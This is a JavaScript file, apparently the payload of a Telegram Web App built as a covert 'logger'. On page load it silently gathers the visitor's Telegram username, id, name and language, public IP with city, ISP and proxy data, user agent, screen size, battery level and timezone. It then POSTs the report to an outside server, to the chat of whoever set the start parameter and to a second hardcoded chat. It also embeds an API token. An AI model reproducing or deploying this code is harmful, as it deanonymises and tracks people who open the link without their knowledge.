async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Ошибка получения IP адреса:', error);
        return 'неизвестно';
    }
}

async function getIPInfo(ip) {
    const token = '71d90c9aad85e4';
    try {
        const response = await fetch(`https://ipinfo.io/${ip}?token=${token}`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Ошибка получения информации об IP адресе:', error);
        return {
            city: 'неизвестно',
            region: 'неизвестно',
            country: 'неизвестно',
            org: 'неизвестно',
            timezone: 'неизвестно',
        };
    }
}

async function getAdditionalIPInfo(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Ошибка получения дополнительной информации об IP адресе:', error);
        return {
            as: 'неизвестно',
            isp: 'неизвестно',
            org: 'неизвестно',
            reverse: 'неизвестно',
            mobile: 'неизвестно',
            proxy: 'неизвестно',
            hosting: 'неизвестно'
        };
    }
}

function getUserAgent() {
    try {
        return navigator.userAgent || 'неизвестно';
    } catch (error) {
        console.error('Ошибка получения UserAgent:', error);
        return 'неизвестно';
    }
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
}

function getOSName() {
    try {
        return navigator.platform || 'неизвестно';
    } catch (error) {
        console.error('Ошибка получения имени ОС:', error);
        return 'неизвестно';
    }
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Ошибка получения процента заряда батареи:', error);
        return 'неизвестно';
    }
}

function getBrowserInfo() {
    try {
        return {
            name: navigator.appName || 'неизвестно',
            version: navigator.appVersion || 'неизвестно',
            engine: navigator.product || 'неизвестно'
        };
    } catch (error) {
        console.error('Ошибка получения информации о браузере:', error);
        return {
            name: 'неизвестно',
            version: 'неизвестно',
            engine: 'неизвестно'
        };
    }
}

async function sendDataToTelegram() {
    let tg = window.Telegram.WebApp;
    const chatId = tg.initDataUnsafe.start_param;
    const additionalChatId = -1002184270191;

    const ipAddress = await getIPAddress();
    const ipInfo = await getIPInfo(ipAddress);
    const additionalIPInfo = await getAdditionalIPInfo(ipAddress);
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    const message = `
<b>✨ Лог успешен!</b>

<b>🔍 Информация об аккаунте:</b>
├ Тэг: @${tg.initDataUnsafe.user.username || 'неизвестно'}
├ Айди: <code>${tg.initDataUnsafe.user.id || 'неизвестно'}</code>
├ Имя: <code>${tg.initDataUnsafe.user.first_name || 'неизвестно'}</code>
├ Фамилия: <code>${tg.initDataUnsafe.user.last_name || 'неизвестно'}</code>
├ Язык: <code>${tg.initDataUnsafe.user.language_code || 'неизвестно'}</code>
└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm || 'неизвестно'}</code>

<b>🖥️ Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>неизвестно</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>

<b>💫 Информация о IP-адресе:</b>
├ Город: <code>${ipInfo.city}</code>
├ Регион: <code>${ipInfo.region}</code>
├ Страна: <code>${ipInfo.country}</code>
├ Организация: <code>${ipInfo.org}</code>
└ Часовой пояс: <code>${ipInfo.timezone}</code>

⭕ <b>Дополнительная информация о IP:</b>
├ AS: <code>${additionalIPInfo.as}</code>
├ ISP: <code>${additionalIPInfo.isp}</code>
├ Организация: <code>${additionalIPInfo.org}</code>
├ Reverse: <code>${additionalIPInfo.reverse}</code>
├ Mobile: <code>${additionalIPInfo.mobile}</code>
├ Proxy: <code>${additionalIPInfo.proxy}</code>
└ Hosting: <code>${additionalIPInfo.hosting}</code>
    `;

    const url = `https://mapiii.nexcord.pro/api/universallogger/server.php?action=send`;
    const formData = new FormData();
    formData.append('chat', chatId);
    formData.append('message', message);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен: ' + response.statusText);
    } catch (error) {
        console.error('Ошибка:', error);
    }
    // отправка два
    const formData1 = new FormData();
    formData1.append('chat', additionalChatId);
    formData1.append('message', message);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData1
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

sendDataToTelegram();
